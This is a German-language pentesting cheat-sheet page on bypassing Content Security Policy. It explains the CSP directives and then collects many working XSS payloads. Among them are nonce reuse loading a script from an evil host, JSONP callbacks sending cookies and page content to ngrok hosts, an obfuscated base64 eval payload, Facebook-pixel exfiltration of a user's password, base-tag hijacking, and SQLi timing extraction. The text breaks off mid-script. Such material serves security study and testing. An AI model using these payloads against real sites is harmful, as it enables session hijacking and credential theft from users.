# Content Security Policy (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## Was ist CSP

Content Security Policy (CSP) ist als Browser-Technologie anerkannt und dient in erster Linie dem **Schutz vor Angriffen wie Cross-Site Scripting (XSS)**. Sie funktioniert, indem Pfade und Quellen definiert und spezifiziert werden, von denen Ressourcen sicher vom Browser geladen werden dürfen. Diese Ressourcen umfassen Elemente wie Bilder, Frames und JavaScript. Beispielsweise kann eine Policy das Laden und Ausführen von Ressourcen aus derselben Domain (`self`) erlauben, einschließlich inline-Ressourcen und der Ausführung von String-Code über Funktionen wie `eval`, `setTimeout` oder `setInterval`.

Die Implementierung von CSP erfolgt über **Response-Header** oder durch Einfügen von **Meta-Elementen in die HTML-Seite**. Browser setzen diese Vorgaben durch und blockieren erkannte Verstöße sofort.

- Implementiert über Response-Header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Über ein Meta-Tag implementiert:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Headers

CSP kann mit diesen Headern durchgesetzt oder überwacht werden:

- `Content-Security-Policy`: Erzwingt die CSP; der Browser blockiert alle Verstöße.
- `Content-Security-Policy-Report-Only`: Wird zur Überwachung verwendet; meldet Verstöße, ohne sie zu blockieren. Ideal zum Testen in Vorproduktionsumgebungen.

### Defining Resources

CSP beschränkt die Ursprünge, von denen sowohl aktiver als auch passiver Content geladen werden darf, und kontrolliert Aspekte wie die Ausführung von Inline-JavaScript und die Verwendung von `eval()`. Ein Beispiel für eine Richtlinie ist:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Direktiven

- **script-src**: Erlaubt bestimmte Quellen für JavaScript, einschließlich URLs, Inline-Skripten und Skripten, die durch Event-Handler oder XSLT-Stylesheets ausgelöst werden.
- **default-src**: Legt eine Standardrichtlinie für das Abrufen von Ressourcen fest, wenn spezifische fetch-Direktiven fehlen.
- **child-src**: Gibt erlaubte Ressourcen für Web Worker und eingebettete Frame-Inhalte an.
- **connect-src**: Beschränkt URLs, die über Schnittstellen wie fetch, WebSocket oder XMLHttpRequest geladen werden können.
- **frame-src**: Beschränkt URLs für Frames.
- **frame-ancestors**: Gibt an, welche Quellen die aktuelle Seite einbetten dürfen; anwendbar auf Elemente wie `<frame>`, `<iframe>`, `<object>`, `<embed>`, und `<applet>`.
- **img-src**: Definiert erlaubte Quellen für Bilder.
- **font-src**: Gibt gültige Quellen für Schriften an, die mittels `@font-face` geladen werden.
- **manifest-src**: Definiert erlaubte Quellen für Application-Manifest-Dateien.
- **media-src**: Definiert erlaubte Quellen zum Laden von Medienobjekten.
- **object-src**: Definiert erlaubte Quellen für `<object>`, `<embed>`, und `<applet>`-Elemente.
- **base-uri**: Gibt erlaubte URLs für das Laden über `<base>`-Elemente an.
- **form-action**: Listet gültige Endpunkte für Formular-Submits auf.
- **plugin-types**: Beschränkt MIME-Typen, die eine Seite aufrufen darf.
- **upgrade-insecure-requests**: Weist Browser an, HTTP-URLs in HTTPS umzuschreiben.
- **sandbox**: Wendet Einschränkungen ähnlich dem sandbox-Attribut eines `<iframe>` an.
- **report-to**: Gibt eine Gruppe an, an die ein Bericht gesendet wird, falls die Richtlinie verletzt wird.
- **worker-src**: Gibt gültige Quellen für Worker-, SharedWorker- oder ServiceWorker-Skripte an.
- **prefetch-src**: Gibt gültige Quellen für Ressourcen an, die geholt oder vorab geladen werden.
- **navigate-to**: Beschränkt die URLs, zu denen ein Dokument auf irgendeine Weise navigieren kann (a, form, window.location, window.open, etc.)

### Quellen

- `*`: Erlaubt alle URLs außer solchen mit den Schemen `data:`, `blob:`, `filesystem:`.
- `'self'`: Erlaubt das Laden aus derselben Domain.
- `'data'`: Erlaubt Ressourcen über das data-Schema zu laden (z. B. Base64-kodierte Bilder).
- `'none'`: Sperrt das Laden von allen Quellen.
- `'unsafe-eval'`: Erlaubt die Verwendung von `eval()` und ähnlichen Methoden; aus Sicherheitsgründen nicht empfohlen.
- `'unsafe-hashes'`: Ermöglicht bestimmte inline Event-Handler.
- `'unsafe-inline'`: Erlaubt die Verwendung von Inline-Ressourcen wie inline `<script>` oder `<style>`; aus Sicherheitsgründen nicht empfohlen.
- `'nonce'`: Eine Whitelist für bestimmte inline-Skripte, die einen kryptographischen Nonce (einmal verwendete Zahl) nutzen.
- If you have JS limited execution it's possible to get a used nonce inside the page with `doc.defaultView.top.document.querySelector("[nonce]")` and then reuse it to load a malicious script (if strict-dynamic is used, any allowed source can load new sources so this isn't needed), like in:

<details>

<summary>Skript laden: Nonce wiederverwenden</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Erlaubt Skripte mit einem spezifischen sha256-Hash.
- `'strict-dynamic'`: Erlaubt das Laden von Skripten aus beliebigen Quellen, wenn diese durch ein nonce oder einen hash auf die Whitelist gesetzt wurden.
- `'host'`: Gibt einen spezifischen Host an, z. B. `example.com`.
- `https:`: Beschränkt URLs auf solche, die HTTPS verwenden.
- `blob:`: Erlaubt das Laden von Ressourcen von Blob-URLs (z. B. Blob-URLs, die via JavaScript erstellt wurden).
- `filesystem:`: Erlaubt das Laden von Ressourcen aus dem Dateisystem.
- `'report-sample'`: Fügt dem Verletzungsbericht ein Beispiel des verletzenden Codes hinzu (nützlich zum Debuggen).
- `'strict-origin'`: Ähnlich wie 'self', stellt jedoch sicher, dass das Protokoll-Sicherheitsniveau der Quellen mit dem des Dokuments übereinstimmt (nur sichere Ursprünge können Ressourcen von sicheren Ursprüngen laden).
- `'strict-origin-when-cross-origin'`: Sendet bei gleichoriginigen Anfragen vollständige URLs, bei cross-origin-Anfragen jedoch nur die Origin.
- `'unsafe-allow-redirects'`: Erlaubt das Laden von Ressourcen, die sofort auf eine andere Ressource weiterleiten. Nicht empfohlen, da es die Sicherheit schwächt.

## Unsichere CSP-Regeln

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Funktionierender payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' über Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> Dies funktioniert nicht, für mehr Infos [**check this**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Funktionierender Payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Wenn du es irgendwie schaffst, dass ein **erlaubter JS-Code ein neues script tag** im DOM mit deinem JS-Code erstellt (weil ein erlaubtes Script es erzeugt), dann wird das **neue script tag zur Ausführung zugelassen**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Funktionierender Payload:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Fehlende object-src- und default-src-Direktiven

> [!CAUTION] > **Es scheint, dass dies nicht mehr funktioniert**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Funktionierende payloads:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Datei-Upload + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Wenn du eine JS-Datei hochladen kannst, kannst du diese CSP umgehen:

Funktionierender payload:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
Es ist jedoch sehr wahrscheinlich, dass der Server die **hochgeladene Datei validiert** und nur zulässt, dass du **bestimmte Dateitypen hochlädst**.

Außerdem, selbst wenn du **JS code inside** in einer Datei hochladen könntest, deren Erweiterung vom Server akzeptiert wird (z. B.: _script.png_), reicht das nicht aus, weil einige Server wie apache server den MIME-Typ der Datei anhand der Erweiterung auswählen und Browser wie Chrome die Ausführung von Javascript-Code innerhalb von etwas, das ein Bild sein sollte, ablehnen. "Glücklicherweise" passieren Fehler. Zum Beispiel habe ich in einem CTF gelernt, dass **Apache doesn't know** die _**.wave**_ Erweiterung, daher serviert es diese nicht mit einem **MIME type like audio/***.

Von hier aus, wenn du eine XSS und einen File Upload findest und es schaffst, eine **misinterpreted extension** zu finden, könntest du versuchen, eine Datei mit dieser Endung und dem Inhalt des Skripts hochzuladen. Oder, wenn der Server das korrekte Format der hochgeladenen Datei prüft, erstelle ein polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

Wenn es nicht möglich ist, JS zu injizieren, könntest du trotzdem versuchen, z. B. Zugangsdaten zu exfiltrieren, indem du eine **injecting a form action** (und eventuell in der Erwartung, dass Password-Manager Passwörter automatisch ausfüllen). Du findest ein [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Außerdem beachte, dass `default-src` form actions nicht abdeckt.

> [!WARNING]
> Bei einigen der folgenden payloads ist **`unsafe-eval` nicht einmal nötig**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Lade eine verwundbare Version von angular und führe beliebigen JS-Code aus:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads, die Angular und eine Bibliothek nutzen, deren Funktionen das `window`-Objekt zurückgeben ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> Der Beitrag zeigt, dass man alle **Bibliotheken** von `cdn.cloudflare.com` (oder einem anderen erlaubten JS libraries repo) **laden** kann, alle hinzugefügten Funktionen jeder Bibliothek ausführen und prüfen, **welche Funktionen aus welchen Bibliotheken das `window`-Objekt zurückgeben**.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS aus einem Klassennamen:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Missbrauch von google recaptcha JS code

Laut [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) kannst du [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) innerhalb einer CSP missbrauchen, um beliebigen JS code auszuführen und die CSP zu umgehen:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Mehr [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### Ausnutzen von www.google.com für open redirect

Die folgende URL leitet zu example.com weiter (von [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Abusing \*.google.com/script.google.com

Es ist möglich, Google Apps Script zu abuse, um Informationen auf einer Seite innerhalb von script.google.com zu empfangen. Wie es [done in this report](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Drittanbieter-Endpunkte + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Szenarien wie dieses, in denen `script-src` auf `self` gesetzt ist und eine bestimmte Domain weißgelistet ist, können mithilfe von JSONP umgangen werden. JSONP-Endpunkte erlauben unsichere Callback-Methoden, die einem Angreifer XSS ermöglichen. Funktionierender Payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **enthält einsatzbereite JSONP-Endpunkte zum CSP-Bypass verschiedener Websites.**

Die gleiche Schwachstelle tritt auf, wenn der **vertrauenswürdige Endpoint ein Open Redirect enthält**, denn wenn der ursprüngliche Endpoint vertraut wird, sind auch Redirects vertrauenswürdig.

### Missbrauch durch Drittanbieter

Wie im [folgenden Beitrag](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses) beschrieben, gibt es viele Drittanbieter-Domains, die in der CSP erlaubt sein könnten und dazu missbraucht werden können, entweder Daten zu exfiltrate oder JavaScript code auszuführen. Einige dieser Drittanbieter sind:

| Anbieter          | Erlaubte Domain                              | Fähigkeiten  |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

Wenn Sie eine der erlaubten Domains in der CSP Ihres Ziels finden, ist die Wahrscheinlichkeit hoch, dass Sie den CSP umgehen können, indem Sie sich beim Drittanbieterdienst registrieren und entweder Daten an diesen Dienst exfiltrate oder JavaScript code ausführen.

Zum Beispiel, wenn Sie die folgende CSP finden:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
oder
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Sie sollten in der Lage sein, Daten zu exfiltrieren, ähnlich wie es schon immer mit [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) gemacht wurde. In diesem Fall folgen Sie diesen allgemeinen Schritten:

1. Erstellen Sie hier ein Facebook Developer account.
2. Erstellen Sie eine neue "Facebook Login"-App und wählen Sie "Website".
3. Gehen Sie zu "Settings -> Basic" und holen Sie Ihre "App ID"
4. Auf der Zielseite, von der Sie Daten exfiltrieren möchten, können Sie Daten exfiltrieren, indem Sie direkt das Facebook SDK-Gadget "fbq" über ein "customEvent" und die data payload verwenden.
5. Gehen Sie zu Ihrer App "Event Manager" und wählen Sie die von Ihnen erstellte Anwendung aus (beachten Sie, dass der Event Manager unter einer URL ähnlich wie dieser zu finden sein kann: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events
6. Wählen Sie den Tab "Test Events", um die von Ihrer Website gesendeten Events zu sehen.

Dann führen Sie auf der Opferseite den folgenden Code aus, um das Facebook tracking pixel so zu initialisieren, dass es auf die App-ID des Angreifers in dessen Facebook Developer account zeigt, und ein custom event auszulösen, wie folgt:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Was die anderen sieben Drittanbieter-Domains aus der vorherigen Tabelle betrifft, gibt es viele weitere Möglichkeiten, wie du sie missbrauchen kannst. Siehe den zuvor [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) für zusätzliche Erklärungen zu anderen Missbräuchen von Drittanbietern.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Zusätzlich zu der oben erwähnten Umleitung zum Umgehen von Pfadbeschränkungen gibt es eine weitere Technik namens Relative Path Overwrite (RPO), die auf einigen Servern verwendet werden kann.

For example, if CSP allows the path `https://example.com/scripts/react/`, it can be bypassed as follows:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Der Browser wird letztendlich `https://example.com/scripts/angular/angular.js` laden.

Das funktioniert, weil der Browser eine Datei mit dem Namen `..%2fangular%2fangular.js` lädt, die sich unter `https://example.com/scripts/react/` befindet, was mit der CSP konform ist.

Dadurch dekodiert er sie und fordert effektiv `https://example.com/scripts/react/../angular/angular.js` an, was äquivalent zu `https://example.com/scripts/angular/angular.js` ist.

Durch **Ausnutzen dieser Inkonsistenz in der URL-Interpretation zwischen dem Browser und dem Server können die Pfadregeln umgangen werden**.

Die Lösung ist, `%2f` auf Serverseite nicht als `/` zu behandeln, sodass eine konsistente Interpretation zwischen Browser und Server gewährleistet ist und dieses Problem vermieden wird.

Online-Beispiel:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS-Ausführung


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### fehlende **base-uri**

Wenn die **base-uri**-Direktive fehlt, kannst du sie ausnutzen, um eine [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html) durchzuführen.

Außerdem, wenn die **Seite ein Script mit einem relativen Pfad lädt** (wie `<script src="/js/app.js">`) und einen **Nonce** verwendet, kannst du das **base** **tag** missbrauchen, damit es das Script **lädt** von **deinem eigenen Server und so XSS ermöglicht.**\
Wenn die verwundbare Seite mit **httpS** geladen wird, verwende in der base eine httpS-URL.
```html
<base href="https://www.attacker.com/" />
```
### AngularJS-Ereignisse

Eine spezifische Richtlinie namens Content Security Policy (CSP) kann JavaScript-Ereignisse einschränken. Nichtsdestotrotz führt AngularJS benutzerdefinierte Ereignisse als Alternative ein. Innerhalb eines Ereignisses stellt AngularJS ein spezielles Objekt `$event` bereit, das auf das native Browser-Ereignisobjekt verweist. Dieses `$event`-Objekt kann ausgenutzt werden, um die CSP zu umgehen. Besonders in Chrome besitzt das `$event/event`-Objekt ein `path`-Attribut, das ein Array von Objekten enthält, die an der Ausführungskette des Ereignisses beteiligt sind, wobei das `window`-Objekt stets am Ende steht. Diese Struktur ist entscheidend für Sandbox-Escape-Taktiken.

Indem dieses Array an den `orderBy`-Filter übergeben wird, ist es möglich, darüber zu iterieren und das letzte Element (das `window`-Objekt) zu verwenden, um eine globale Funktion wie `alert()` auszulösen. Der unten gezeigte Codeausschnitt veranschaulicht diesen Vorgang:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Dieses Snippet hebt die Verwendung der Direktive `ng-focus` hervor, um das Event auszulösen, dabei `$event.path|orderBy` einzusetzen, um das `path`-Array zu manipulieren, und das `window`-Objekt zu nutzen, um die Funktion `alert()` auszuführen und so `document.cookie` offenzulegen.

**Weitere Angular bypasses finden Sie in** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS und whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Eine CSP-Policy, die Domains für das Laden von Scripts in einer Angular JS-Anwendung auf eine Whitelist setzt, kann durch das Aufrufen von callback functions und bestimmten vulnerable classes umgangen werden. Weitere Informationen zu dieser Technik finden sich in einem ausführlichen Guide in diesem [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22).

Funktionierende payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Weitere JSONP arbitrary execution endpoints sind in [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) zu finden (einige von ihnen wurden gelöscht oder behoben)

### Umgehung durch Weiterleitung

Was passiert, wenn CSP auf eine serverseitige Weiterleitung trifft? Wenn die Weiterleitung zu einer anderen Origin führt, die nicht erlaubt ist, schlägt sie trotzdem fehl.

Laut der Beschreibung in [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) kann eine Weiterleitung, die zu einem anderen Pfad führt, die ursprünglichen Einschränkungen umgehen.

Hier ist ein Beispiel:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Wenn CSP auf `https://www.google.com/a/b/c/d` gesetzt ist, werden, da der Pfad berücksichtigt wird, sowohl die Skripte `/test` als auch `/a/test` von CSP blockiert.

Das finale `http://localhost:5555/301` wird jedoch **auf der Serverseite zu `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//` umgeleitet**. Da es sich um eine Weiterleitung handelt, wird der **Pfad nicht berücksichtigt**, und das **Skript kann geladen werden**, wodurch die Pfadbeschränkung umgangen wird.

Durch diese Weiterleitung wird selbst dann, wenn der Pfad vollständig angegeben ist, dieser weiterhin umgangen.

Daher ist die beste Lösung sicherzustellen, dass die Website keine open redirect vulnerabilities aufweist und dass in den CSP-Regeln keine Domains enthalten sind, die ausgenutzt werden können.

### Bypass CSP with dangling markup

Read [how here](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` bedeutet, dass du beliebige Skripte im Code ausführen kannst (XSS kann Code ausführen) und `img-src *` bedeutet, dass du auf der Webseite jedes Bild von beliebigen Ressourcen verwenden kannst.

Du kannst diese CSP umgehen, indem du die Daten über Bilder exfiltrierst (in diesem Fall missbraucht das XSS ein CSRF, bei dem eine vom bot erreichbare Seite eine SQLi enthält, und das Flag über ein Bild extrahiert):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
Von: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Du könntest diese Konfiguration auch missbrauchen, um **in ein Bild eingebetteten javascript code zu laden**. Wenn die Seite zum Beispiel das Laden von Bildern von Twitter erlaubt, könntest du ein **spezielles Bild** **erstellen**, es zu Twitter **hochladen** und das "**unsafe-inline**" missbrauchen, um einen JS-Code (wie bei einem normalen XSS) zu **ausführen**, der das **Bild** **lädt**, das **JS** daraus **extrahiert** und **ausführt**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Mit Service Workers

Die **`importScripts`**-Funktion von Service workers ist nicht durch CSP eingeschränkt:

{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Research:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Wenn ein von dir gesendeter **Parameter** in die **Deklaration** der **Policy** eingefügt wird, könntest du die **Policy** so **ändern**, dass sie **nutzlos** wird. Du könntest **allow script 'unsafe-inline'** mit einem dieser Bypässe erlauben:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Weil diese Direktive bestehende script-src directives **überschreibt**.\
Ein Beispiel findest du hier: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

In Edge ist es viel einfacher. Wenn du in die CSP nur dies hinzufügen kannst: **`;_`** würde **Edge** die gesamte **policy** verwerfen.\
Beispiel: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Time attack

Beachte das Fehlen der Direktive `'unsafe-inline'`\
Diesmal kannst du das Opfer dazu bringen, über **XSS** mit einem `<iframe` eine von dir kontrollierte Seite zu **laden**. Diesmal bringst du das Opfer dazu, die Seite aufzurufen, von der du Informationen extrahieren möchtest (**CSRF**). Du kannst nicht auf den Inhalt der Seite zugreifen, aber wenn du irgendwie **die Ladezeit der Seite kontrollieren** kannst, kannst du die benötigten Informationen extrahieren.

Dieses Mal wird ein **flag** extrahiert: jedes Mal, wenn ein **char korrekt geraten** wird via SQLi, braucht die **response** aufgrund der sleep function **mehr Zeit**. Dann wirst du in der Lage sein, das flag zu extrahieren:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
